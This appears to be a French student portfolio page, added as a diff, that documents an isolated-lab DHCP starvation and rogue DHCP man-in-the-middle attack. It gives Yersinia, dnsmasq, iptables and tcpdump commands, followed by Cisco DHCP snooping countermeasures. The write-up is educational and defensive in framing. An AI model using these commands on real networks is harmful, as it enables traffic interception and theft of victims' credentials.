@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DHCP Starvation & Rogue DHCP | Miguel Etienne</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root{
+  --bg:#0a0a0a;--bg2:#111;--bg3:#1a1a1a;
+  --red:#ff3333;--red2:#ff6666;--redl:rgba(255,51,51,0.08);--redb:rgba(255,51,51,0.25);
+  --grn:#00ff88;--grn2:#66ffaa;--grnl:rgba(0,255,136,0.07);
+  --amber:#ffaa00;--ambl:rgba(255,170,0,0.08);
+  --text:#f0f0f0;--muted:#666;--border:rgba(255,255,255,0.07);
+  --f:'Space Grotesk',sans-serif;--m:'Space Mono',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--f);font-size:15px;line-height:1.7;overflow-x:hidden}
+
+/* SCAN LINES */
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,0.008) 3px,rgba(255,255,255,0.008) 4px);pointer-events:none;z-index:9999}
+
+/* NAV */
+header{position:fixed;top:0;left:0;right:0;z-index:500;background:rgba(10,10,10,0.97);border-bottom:1px solid var(--border);height:54px;display:flex;align-items:center;padding:0 2rem;justify-content:space-between}
+.nav-back{display:flex;align-items:center;gap:8px;color:var(--red);text-decoration:none;font-family:var(--m);font-size:10px;letter-spacing:.08em;transition:gap .2s}
+.nav-back:hover{gap:13px}
+.nav-logo{font-family:var(--f);font-weight:700;font-size:15px;color:var(--text);text-decoration:none;letter-spacing:-.02em}
+.nav-logo span{color:var(--red)}
+.nav-badge{font-family:var(--m);font-size:8.5px;color:var(--red);letter-spacing:.15em;text-transform:uppercase;border:1px solid var(--redb);padding:4px 10px;border-radius:2px}
+
+/* HERO */
+.hero{padding:100px 2rem 60px;max-width:1100px;margin:0 auto;position:relative}
+.hero-grid{display:grid;grid-template-columns:1fr 420px;gap:4rem;align-items:center}
+.hero-kicker{font-family:var(--m);font-size:9px;color:var(--red);letter-spacing:.22em;text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:10px}
+.hero-kicker::before{content:'';width:24px;height:1px;background:var(--red)}
+h1{font-size:clamp(2.5rem,5.5vw,4.5rem);font-weight:700;line-height:1.05;letter-spacing:-.03em;color:var(--text);margin-bottom:1rem}
+h1 .hl{color:var(--red);display:block}
+h1 .hl2{color:var(--grn);font-size:.65em;display:block;margin-top:4px;font-weight:400;letter-spacing:0}
+.hero-desc{font-size:15px;color:var(--muted);font-weight:300;line-height:1.85;margin-bottom:2rem}
+.hero-tags{display:flex;flex-wrap:wrap;gap:6px}
+.htag{font-family:var(--m);font-size:8.5px;padding:4px 11px;border-radius:2px;letter-spacing:.1em;text-transform:uppercase;border:1px solid var(--border);color:var(--muted)}
+.htag.danger{border-color:var(--redb);color:var(--red);background:var(--redl)}
+.htag.safe{border-color:rgba(0,255,136,.2);color:var(--grn);background:var(--grnl)}
+
+/* TERMINAL HERO */
+.hero-terminal{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.term-bar{background:#1a1a1a;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
+.dot{width:9px;height:9px;border-radius:50%}
+.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
+.term-lbl{margin-left:auto;font-family:var(--m);font-size:8.5px;color:var(--muted)}
+.term-body{padding:18px 20px;font-family:var(--m);font-size:11.5px;line-height:2;color:var(--grn)}
+.tc{color:#444}.tr{color:var(--red)}.tw{color:var(--amber)}.tg{color:var(--grn)}.tb{color:#5588ff}
+.cursor{display:inline-block;width:8px;height:14px;background:var(--grn);animation:blink .8s step-end infinite;vertical-align:middle;margin-left:2px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* CONTENT */
+.content{max-width:1100px;margin:0 auto;padding:0 2rem 6rem}
+
+/* SECTION */
+.sl{display:flex;align-items:center;gap:14px;margin:3rem 0 1.5rem}
+.sl-line{flex:1;height:1px;background:var(--border)}
+.sl-txt{font-family:var(--m);font-size:9px;color:var(--muted);letter-spacing:.2em;text-transform:uppercase;white-space:nowrap}
+
+/* CARD */
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:1.75rem;margin-bottom:1.25rem}
+.card.danger{border-color:var(--redb)}
+.card.safe{border-color:rgba(0,255,136,.2)}
+.card.neutral{border-left:3px solid var(--amber)}
+
+/* ARCHI DIAGRAM */
+.archi{display:grid;grid-template-columns:1fr auto 1fr auto 1fr;gap:0;align-items:center;margin:1.5rem 0;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:1.5rem}
+.archi-node{display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
+.an-box{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:10px 14px;font-family:var(--m);font-size:9.5px;color:var(--text);white-space:nowrap}
+.an-box.atk{border-color:var(--redb);color:var(--red);background:var(--redl)}
+.an-box.srv{border-color:rgba(0,255,136,.2);color:var(--grn);background:var(--grnl)}
+.an-box.victim{border-color:rgba(255,170,0,.25);color:var(--amber);background:var(--ambl)}
+.an-lbl{font-family:var(--m);font-size:8px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase}
+.archi-arrow{color:var(--muted);font-size:20px;padding:0 8px}
+.archi-arrow.red{color:var(--red)}
+
+/* PHASES */
+.phases{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1.25rem}
+.phase{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:1.25rem}
+.phase-num{font-family:var(--m);font-size:8px;color:var(--muted);letter-spacing:.18em;text-transform:uppercase;margin-bottom:4px}
+.phase-title{font-size:13.5px;font-weight:600;color:var(--text);margin-bottom:6px}
+.phase.p-atk{border-left:2.5px solid var(--red)}
+.phase.p-def{border-left:2.5px solid var(--grn)}
+.phase-title.atk{color:var(--red)}
+.phase-title.def{color:var(--grn)}
+
+/* CODE BLOCK */
+.codeblock{background:#0d0d0d;border:1px solid var(--border);border-radius:4px;margin-bottom:1.25rem;overflow:hidden}
+.cb-bar{background:#141414;padding:8px 16px;border-bottom:1px solid var(--border);font-family:var(--m);font-size:8.5px;color:var(--muted);display:flex;align-items:center;gap:8px}
+.cb-bar i{color:var(--red);font-size:9px}
+.cb-bar.safe i{color:var(--grn)}
+.codeblock pre{padding:16px 20px;font-family:var(--m);font-size:11px;line-height:1.9;color:#aaa;overflow-x:auto}
+.cmd{color:var(--amber)}.arg{color:#88aaff}.val{color:var(--grn)}.com{color:#3a3a3a}
+
+/* NOTE */
+.note{display:flex;gap:10px;padding:12px 16px;border-radius:4px;margin-bottom:1.25rem;font-size:13px}
+.note i{flex-shrink:0;margin-top:2px}
+.note.warn{background:var(--redl);border:1px solid var(--redb);color:#ff9999}
+.note.info{background:var(--grnl);border:1px solid rgba(0,255,136,.2);color:var(--grn2)}
+.note.amber{background:var(--ambl);border:1px solid rgba(255,170,0,.2);color:var(--amber)}
+
+/* TABLE */
+.dt{width:100%;border-collapse:collapse;margin-bottom:1.25rem;font-size:12px}
+.dt th{background:var(--bg3);color:var(--muted);font-family:var(--m);font-size:8.5px;letter-spacing:.15em;text-transform:uppercase;padding:9px 12px;text-align:left;border-bottom:1px solid var(--border)}
+.dt td{padding:9px 12px;border-bottom:1px solid rgba(255,255,255,0.04);color:#ccc;font-family:var(--m);font-size:10.5px}
+.dt tr:last-child td{border-bottom:none}
+.dt tr:hover td{background:rgba(255,255,255,.02)}
+.bz{display:inline-block;padding:2px 8px;border-radius:2px;font-size:8.5px;font-weight:700;letter-spacing:.08em;font-family:var(--m)}
+.br{background:var(--redl);color:var(--red);border:1px solid var(--redb)}
+.bg{background:var(--grnl);color:var(--grn);border:1px solid rgba(0,255,136,.2)}
+
+/* PHOTO */
+.pzone{border:1.5px dashed rgba(255,51,51,0.2);border-radius:4px;background:rgba(255,51,51,0.02);position:relative;overflow:hidden;cursor:pointer;transition:all .2s;margin-bottom:10px}
+.pzone:hover{border-color:rgba(255,51,51,.5);background:rgba(255,51,51,.04)}
+.pzone.safe-zone{border-color:rgba(0,255,136,.2);background:var(--grnl)}
+.pzone.safe-zone:hover{border-color:rgba(0,255,136,.5)}
+.pzone input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;z-index:2}
+.pzone-inner{padding:26px 20px;text-align:center;pointer-events:none}
+.pzone-img{width:100%;max-height:440px;object-fit:contain;border-radius:4px;display:none;padding:8px}
+.pzone-saved{display:none;position:absolute;top:8px;right:8px;background:var(--grn);color:#000;font-family:var(--m);font-size:8.5px;padding:3px 8px;border-radius:2px;z-index:3}
+.phi{font-size:1.6rem;margin-bottom:10px;display:block;opacity:.3}
+.php{font-family:var(--m);font-size:10px;color:#333;letter-spacing:.1em}
+.phs{display:block;font-size:10px;color:#222;margin-top:3px}
+.pg{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:4px}
+
+footer{text-align:center;padding:2.5rem;font-family:var(--m);font-size:9px;color:#222;letter-spacing:.25em;text-transform:uppercase;border-top:1px solid var(--border)}
+
+@media(max-width:800px){
+  .hero-grid{grid-template-columns:1fr}
+  .hero-terminal{display:none}
+  .phases{grid-template-columns:1fr}
+  .archi{grid-template-columns:1fr;gap:8px}
+  .archi-arrow{transform:rotate(90deg)}
+  .pg{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <a href="projets.html" class="nav-back"><i class="fas fa-arrow-left"></i> Projets</a>
+  <span class="nav-badge">⚠ Projet personnel · Lab isolé</span>
+  <a href="index.html" class="nav-logo">Miguel<span>.SIO</span></a>
+</header>
+
+<div class="hero">
+  <div class="hero-grid">
+    <div>
+      <div class="hero-kicker">Projet personnel · Cybersécurité offensive & défensive</div>
+      <h1>
+        DHCP Starvation
+        <span class="hl">& Rogue DHCP</span>
+        <span class="hl2">Attaque MITM par empoisonnement réseau</span>
+      </h1>
+      <p class="hero-desc">Démonstration en environnement isolé d'une attaque DHCP en deux phases : saturation du pool d'adresses du serveur légitime (Starvation), puis déploiement d'un faux serveur DHCP (Rogue) pour intercepter le trafic réseau des victimes.</p>
+      <div class="hero-tags">
+        <span class="htag danger">Attaque MITM</span>
+        <span class="htag danger">DHCP Starvation</span>
+        <span class="htag danger">Rogue DHCP</span>
+        <span class="htag safe">Lab isolé · VirtualBox</span>
+        <span class="htag safe">Kali Linux</span>
+        <span class="htag">Wireshark</span>
+        <span class="htag">Yersinia</span>
+      </div>
+    </div>
+    <div class="hero-terminal">
+      <div class="term-bar">
+        <div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div>
+        <span class="term-lbl">kali@lab — dhcp_attack.sh</span>
+      </div>
+      <div class="term-body">
+<span class="tc"># Phase 1 — Starvation</span>
+<span class="tw">$</span> <span class="tg">yersinia</span> dhcp <span class="tb">-attack</span> 1
+<span class="tc"># Sending 65536 DISCOVER...</span>
+<span class="tr">[!] Pool exhausted: 0/254 left</span>
+
+<span class="tc"># Phase 2 — Rogue DHCP</span>
+<span class="tw">$</span> <span class="tg">dnsmasq</span> <span class="tb">--dhcp-range</span>=<span class="tr">192.168.1.100,200</span>
+<span class="tw">$</span> <span class="tg">ip route add default</span> via 192.168.1.1
+<span class="tr">[✓] Rogue DHCP active on eth0</span>
+<span class="tr">[✓] Victim gateway → 192.168.1.5</span>
+
+<span class="tc"># Interception trafic</span>
+<span class="tw">$</span> <span class="tg">tcpdump</span> <span class="tb">-i</span> eth0 <span class="tb">-w</span> capture.pcap<span class="cursor"></span></div>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">01 — Contexte & objectifs</span><div class="sl-line"></div></div>
+
+  <div class="card">
+    <p style="color:#aaa;font-size:14px;line-height:1.85;margin-bottom:1rem">Ce projet personnel a été réalisé dans un <strong style="color:var(--text)">environnement de lab entièrement isolé</strong> (VirtualBox, réseau interne, aucune connexion internet). L'objectif est de comprendre en profondeur les vulnérabilités du protocole DHCP, de démontrer comment elles peuvent être exploitées, et d'identifier les contre-mesures à mettre en place côté infrastructure.</p>
+    <div class="note amber"><i class="fas fa-exclamation-triangle"></i><span><strong>Cadre éthique :</strong> Cette démonstration est réalisée exclusivement sur un réseau virtuel isolé créé à cet effet. Ces techniques ne doivent jamais être utilisées sur un réseau sans autorisation explicite. Le but est pédagogique : comprendre pour mieux défendre.</span></div>
+  </div>
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">02 — Architecture du lab</span><div class="sl-line"></div></div>
+
+  <div class="card">
+    <p style="color:#aaa;font-size:13.5px;margin-bottom:1rem">3 machines virtuelles sur un réseau interne VirtualBox (192.168.1.0/24), sans accès internet :</p>
+    <div class="archi">
+      <div class="archi-node">
+        <div class="an-box srv">🛡 DHCP Légitime<br>192.168.1.1</div>
+        <div class="an-lbl">Windows Server 2022</div>
+      </div>
+      <div class="archi-arrow">⟷</div>
+      <div class="archi-node">
+        <div class="an-box victim">💻 Victime<br>192.168.1.x (DHCP)</div>
+        <div class="an-lbl">Windows 11</div>
+      </div>
+      <div class="archi-arrow red">←</div>
+      <div class="archi-node">
+        <div class="an-box atk">☠ Attaquant<br>192.168.1.5</div>
+        <div class="an-lbl">Kali Linux</div>
+      </div>
+    </div>
+    <table class="dt">
+      <thead><tr><th>VM</th><th>Système</th><th>IP</th><th>Rôle</th></tr></thead>
+      <tbody>
+        <tr><td>VM-Server</td><td><span class="bz bg">Windows Server 2022</span></td><td>192.168.1.1</td><td>Serveur DHCP légitime (pool /24)</td></tr>
+        <tr><td>VM-Victim</td><td>Windows 11</td><td>192.168.1.x</td><td>Poste client — cible de l'attaque</td></tr>
+        <tr><td>VM-Kali</td><td><span class="bz br">Kali Linux</span></td><td>192.168.1.5</td><td>Machine attaquante — Rogue DHCP</td></tr>
+      </tbody>
+    </table>
+    <div class="pg">
+      <div class="pzone" data-key="dhcp-archi" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'dhcp-archi')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-project-diagram phi" style="color:var(--red)"></i><p class="php">CAPTURE — VirtualBox · 3 VMs configurées</p><span class="phs">Réseau interne isolé, VMs démarrées</span></div></div>
+      <div class="pzone" data-key="dhcp-net" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'dhcp-net')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-network-wired phi" style="color:var(--red)"></i><p class="php">CAPTURE — Config réseau VirtualBox</p><span class="phs">Réseau interne — pas de NAT</span></div></div>
+    </div>
+  </div>
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">03 — Phase 1 : DHCP Starvation</span><div class="sl-line"></div></div>
+
+  <div class="card danger">
+    <p style="color:#aaa;font-size:13.5px;margin-bottom:1rem">L'attaque par <strong style="color:var(--text)">DHCP Starvation</strong> consiste à envoyer massivement des requêtes DHCP DISCOVER avec des adresses MAC aléatoires forgées. Le serveur DHCP légitime alloue une adresse IP à chacune de ces fausses requêtes jusqu'à épuiser totalement son pool d'adresses. Aucun nouveau client ne peut alors obtenir d'IP.</p>
+    <div class="codeblock">
+      <div class="cb-bar"><i class="fas fa-skull-crossbones"></i> kali@lab — Phase 1 : saturation du pool DHCP</div>
+      <pre><span class="com"># Installation de Yersinia</span>
+<span class="cmd">sudo apt install</span> <span class="arg">-y</span> <span class="val">yersinia</span>
+
+<span class="com"># Lancement de l'attaque DHCP Starvation</span>
+<span class="com"># -attack 1 = DHCP Discover flood avec MACs aléatoires</span>
+<span class="cmd">sudo yersinia</span> dhcp <span class="arg">-interface</span> <span class="val">eth0</span> <span class="arg">-attack</span> <span class="val">1</span>
+
+<span class="com"># Alternative avec dhcpstarv</span>
+<span class="cmd">sudo dhcpstarv</span> <span class="arg">-i</span> <span class="val">eth0</span>
+
+<span class="com"># Vérification sur le serveur Windows — pool épuisé</span>
+<span class="com"># Commande PowerShell sur VM-Server :</span>
+<span class="cmd">Get-DhcpServerv4Lease</span> <span class="arg">-ScopeId</span> <span class="val">192.168.1.0</span> | <span class="cmd">Measure-Object</span>
+<span class="com"># → Count : 254 (pool entier alloué à de fausses MACs)</span></pre>
+    </div>
+    <div class="pg">
+      <div class="pzone" data-key="starvation-1" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'starvation-1')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-terminal phi" style="color:var(--red)"></i><p class="php">CAPTURE — Yersinia en action</p><span class="phs">Flood de DHCP DISCOVER en cours</span></div></div>
+      <div class="pzone" data-key="starvation-2" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'starvation-2')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-server phi" style="color:var(--red)"></i><p class="php">CAPTURE — Pool DHCP épuisé (serveur)</p><span class="phs">Console DHCP Windows — 254/254 baux alloués</span></div></div>
+    </div>
+    <div class="pzone" data-key="starvation-3" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'starvation-3')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-chart-bar phi" style="color:var(--red)"></i><p class="php">CAPTURE — Wireshark : DHCP DISCOVER flood</p><span class="phs">Capture réseau des requêtes avec MACs forgées</span></div></div>
+  </div>
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">04 — Phase 2 : Rogue DHCP (MITM)</span><div class="sl-line"></div></div>
+
+  <div class="card danger">
+    <p style="color:#aaa;font-size:13.5px;margin-bottom:1rem">Une fois le pool légitime épuisé, on déploie un <strong style="color:var(--text)">faux serveur DHCP</strong> sur la machine Kali. Il répond aux nouvelles requêtes DHCP des victimes en leur fournissant une adresse IP <strong style="color:var(--red)">avec la machine attaquante comme passerelle par défaut</strong>. Tout le trafic de la victime transite alors par l'attaquant — c'est le Man-in-the-Middle.</p>
+    <div class="codeblock">
+      <div class="cb-bar"><i class="fas fa-skull-crossbones"></i> kali@lab — Phase 2 : Rogue DHCP + interception</div>
+      <pre><span class="com"># Configurer le Rogue DHCP avec dnsmasq</span>
+<span class="com"># /etc/dnsmasq.conf :</span>
+<span class="val">interface=eth0</span>
+<span class="val">dhcp-range=192.168.1.150,192.168.1.200,255.255.255.0,12h</span>
+<span class="val">dhcp-option=3,192.168.1.5</span>   <span class="com"># Gateway = attaquant</span>
+<span class="val">dhcp-option=6,8.8.8.8</span>       <span class="com"># DNS public</span>
+
+<span class="cmd">sudo systemctl start</span> dnsmasq
+
+<span class="com"># Activer le forwarding IP (pour que la victime garde internet)</span>
+<span class="cmd">sudo echo</span> <span class="val">1</span> > /proc/sys/net/ipv4/ip_forward
+
+<span class="com"># Règle iptables pour forwarder le trafic</span>
+<span class="cmd">sudo iptables -t nat -A POSTROUTING -o</span> <span class="val">eth0</span> <span class="arg">-j</span> MASQUERADE
+
+<span class="com"># Capturer le trafic intercepté avec tcpdump</span>
+<span class="cmd">sudo tcpdump</span> <span class="arg">-i</span> <span class="val">eth0</span> <span class="arg">-w</span> <span class="val">mitm_capture.pcap</span>
+
+<span class="com"># Analyser dans Wireshark — credentials HTTP en clair</span>
+<span class="cmd">wireshark</span> mitm_capture.pcap</pre>
+    </div>
+    <div class="pg">
+      <div class="pzone" data-key="rogue-1" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'rogue-1')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-broadcast-tower phi" style="color:var(--red)"></i><p class="php">CAPTURE — Rogue DHCP actif</p><span class="phs">dnsmasq démarré — victime reçoit IP avec fausse GW</span></div></div>
+      <div class="pzone" data-key="rogue-2" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'rogue-2')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-eye phi" style="color:var(--red)"></i><p class="php">CAPTURE — Wireshark : trafic intercepté</p><span class="phs">Trafic victime visible sur machine Kali</span></div></div>
+    </div>
+    <div class="pzone" data-key="rogue-3" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'rogue-3')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-laptop phi" style="color:var(--red)"></i><p class="php">CAPTURE — Victime : config IP (fausse gateway)</p><span class="phs">ipconfig /all sur Windows 11 — GW = 192.168.1.5</span></div></div>
+  </div>
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">05 — Contre-mesures & défenses</span><div class="sl-line"></div></div>
+
+  <div class="card safe">
+    <p style="color:#aaa;font-size:13.5px;margin-bottom:1.25rem">La protection contre ces attaques repose sur des fonctionnalités intégrées aux commutateurs managés Cisco.</p>
+    <div class="phases">
+      <div class="phase p-def">
+        <div class="phase-num">Contre-mesure 1</div>
+        <div class="phase-title def">DHCP Snooping</div>
+        <p style="font-size:12.5px;color:#888;line-height:1.7">Fonction Cisco qui filtre les réponses DHCP. Seuls les ports <strong style="color:var(--grn)">trusted</strong> (connectés au vrai serveur DHCP) peuvent envoyer des OFFER/ACK. Tous les autres ports sont <strong style="color:var(--red)">untrusted</strong> et bloquent les réponses DHCP.</p>
+      </div>
+      <div class="phase p-def">
+        <div class="phase-num">Contre-mesure 2</div>
+        <div class="phase-title def">Port Security · Rate Limiting</div>
+        <p style="font-size:12.5px;color:#888;line-height:1.7">Limitation du nombre de trames par seconde sur chaque port pour bloquer le flood. La fonction <strong style="color:var(--grn)">ip dhcp snooping limit rate</strong> bloque automatiquement le port si le débit DHCP dépasse le seuil.</p>
+      </div>
+      <div class="phase p-def">
+        <div class="phase-num">Contre-mesure 3</div>
+        <div class="phase-title def">Dynamic ARP Inspection</div>
+        <p style="font-size:12.5px;color:#888;line-height:1.7">Valide les paquets ARP en vérifiant la cohérence IP/MAC via la table DHCP Snooping. Empêche l'empoisonnement ARP complémentaire à l'attaque Rogue DHCP.</p>
+      </div>
+      <div class="phase p-def">
+        <div class="phase-num">Contre-mesure 4</div>
+        <div class="phase-title def">802.1X · Authentification réseau</div>
+        <p style="font-size:12.5px;color:#888;line-height:1.7">Authentification de chaque équipement avant accès au réseau via RADIUS/NPS. Un équipement non authentifié (comme la Kali) ne peut pas se connecter et donc pas lancer l'attaque.</p>
+      </div>
+    </div>
+    <div class="codeblock">
+      <div class="cb-bar safe"><i class="fas fa-shield-alt"></i> Cisco IOS — DHCP Snooping (contre-mesure)</div>
+      <pre><span class="com">! Activer DHCP Snooping globalement</span>
+<span class="cmd">ip dhcp snooping</span>
+<span class="cmd">ip dhcp snooping vlan</span> <span class="val">1-100</span>
+
+<span class="com">! Définir le port vers le serveur DHCP comme trusted</span>
+<span class="cmd">interface</span> <span class="val">GigabitEthernet0/1</span>
+<span class="cmd"> ip dhcp snooping trust</span>
+
+<span class="com">! Limiter le débit DHCP sur les ports clients (10 paquets/s max)</span>
+<span class="cmd">interface</span> <span class="val">GigabitEthernet0/2</span>
+<span class="cmd"> ip dhcp snooping limit rate</span> <span class="val">10</span>
+
+<span class="com">! Vérification</span>
+<span class="cmd">show ip dhcp snooping binding</span>
+<span class="cmd">show ip dhcp snooping statistics</span></pre>
+    </div>
+    <div class="pg">
+      <div class="pzone safe-zone" data-key="def-1" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'def-1')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-shield-alt phi" style="color:var(--grn)"></i><p class="php">CAPTURE — DHCP Snooping configuré</p><span class="phs">Attaque bloquée après activation de la contre-mesure</span></div></div>
+      <div class="pzone safe-zone" data-key="def-2" onclick="triggerFile(this)"><input type="file" accept="image/*" onchange="savePhoto(this,'def-2')"><span class="pzone-saved">✓</span><img class="pzone-img" alt=""><div class="pzone-inner"><i class="fas fa-chart-line phi" style="color:var(--grn)"></i><p class="php">CAPTURE — show ip dhcp snooping statistics</p><span class="phs">Paquets filtrés et ports bloqués visibles</span></div></div>
+    </div>
+  </div>
+
+  <div class="sl"><div class="sl-line"></div><span class="sl-txt">06 — Compétences mobilisées</span><div class="sl-line"></div></div>
+
+  <div class="card">
+    <table class="dt">
+      <thead><tr><th>Domaine</th><th>Compétence</th><th>Application</th></tr></thead>
+      <tbody>
+        <tr><td>Cybersécurité offensive</td><td>Attaque DHCP Starvation</td><td>Épuisement pool DHCP avec Yersinia sur réseau virtuel</td></tr>
+        <tr><td>Cybersécurité offensive</td><td>Man-in-the-Middle</td><td>Rogue DHCP + ip_forward + capture trafic victime</td></tr>
+        <tr><td>Analyse réseau</td><td>Wireshark / tcpdump</td><td>Capture et analyse de paquets DHCP et HTTP</td></tr>
+        <tr><td>Linux & Administration</td><td>Kali Linux · dnsmasq · iptables</td><td>Configuration du faux serveur DHCP et du forwarding</td></tr>
+        <tr><td>Sécurité défensive</td><td>DHCP Snooping Cisco</td><td>Configuration CLI IOS pour bloquer l'attaque</td></tr>
+        <tr><td>Sécurité défensive</td><td>Dynamic ARP Inspection</td><td>Protection complémentaire contre ARP poisoning</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</div>
+
+<footer>Miguel Etienne &nbsp;·&nbsp; Projet Personnel · DHCP Starvation &amp; Rogue DHCP &nbsp;·&nbsp; 2026</footer>
+
+<script>
+const DB='dhcp_photos',VR=1,ST='photos';let db=null;
+function openDB(){return new Promise((r,j)=>{const q=indexedDB.open(DB,VR);q.onupgradeneeded=e=>e.target.result.createObjectStore(ST);q.onsuccess=e=>{db=e.target.result;r()};q.onerror=e=>j(e)})}
+function show(z,src){const img=z.querySelector('.pzone-img');const ph=z.querySelector('.pzone-inner');const b=z.querySelector('.pzone-saved');img.src=src;img.style.display='block';ph.style.display='none';b.style.display='block';z.style.cursor='default';img.onclick=e=>{e.stopPropagation();z.querySelector('input').click()}}
+function savePhoto(inp,key){if(!inp.files||!inp.files[0])return;const r=new FileReader();r.onload=async e=>{const s=e.target.result;const tx=db.transaction(ST,'readwrite');tx.objectStore(ST).put(s,key);show(inp.closest('.pzone'),s);inp.value=''};r.readAsDataURL(inp.files[0])}
+function triggerFile(z){if(z.querySelector('.pzone-img').style.display==='block')return;z.querySelector('input').click()}
+async function init(){try{await openDB();document.querySelectorAll('.pzone[data-key]').forEach(async z=>{const tx=db.transaction(ST,'readonly');const req=tx.objectStore(ST).get(z.dataset.key);req.onsuccess=e=>{if(e.target.result)show(z,e.target.result)}})}catch(e){}}
+init();
+</script>
+</body>
+</html>
